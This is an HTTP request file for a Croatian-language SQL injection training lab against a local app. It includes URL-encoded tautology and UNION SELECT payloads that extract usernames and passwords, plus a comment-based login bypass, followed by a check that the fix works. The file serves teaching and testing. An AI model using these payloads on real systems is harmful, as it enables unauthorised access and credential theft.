### =====================================================================
### Lab07 – A05 Injection: SQL injection (CWE-89)
### Upute: docs/labs/lab07-sql-injection.md
### Napomena: payloadi su URL-kodirani (%27 = ', %25 = %, %20 = razmak, %3D = =)
### =====================================================================
@host = http://localhost:5080

### 1) Legitimna pretraga – 1 rezultat (Laptop)
GET {{host}}/api/lab07/products/search?q=Laptop

### 2) Jednostruki navodnik – ranjivo: 400 "Greška u upitu." (signal da se unos umeće u SQL)
GET {{host}}/api/lab07/products/search?q=%27

### 3) NAPAD: tautologija  ' OR '1'='1' --   → vraća i skriveni "Interni prototip X"
GET {{host}}/api/lab07/products/search?q=%27%20OR%20%271%27%3D%271%27%20--

### 4) NAPAD: tautologija  %' OR 1=1 --
GET {{host}}/api/lab07/products/search?q=%25%27%20OR%201%3D1%20--

### 5) NAPAD: UNION  %' UNION SELECT id, username, password, 0 FROM lab07_accounts --
###    → korisnička imena i lozinke iz druge tablice
GET {{host}}/api/lab07/products/search?q=%25%27%20UNION%20SELECT%20id%2C%20username%2C%20password%2C%200%20FROM%20lab07_accounts%20--

### 6) Ispravna prijava – 200
POST {{host}}/api/lab07/login
Content-Type: application/json

{"username": "admin", "password": "SuperTajna2026"}

### 7) NAPAD: zaobilaženje prijave komentarom  admin'--  (bilo koja lozinka) – ranjivo: 200
POST {{host}}/api/lab07/login
Content-Type: application/json

{"username": "admin'--", "password": "bilo-sto"}

### 8) NAPAD: tautologija u lozinci
POST {{host}}/api/lab07/login
Content-Type: application/json

{"username": "admin", "password": "' OR '1'='1"}

### 9) PROVJERA POPRAVKA: 3)–5) vraćaju [] (200), 7) i 8) vraćaju 401, a 1) i 6) i dalje rade
GET {{host}}/api/lab07/products/search?q=%27%20OR%20%271%27%3D%271%27%20--
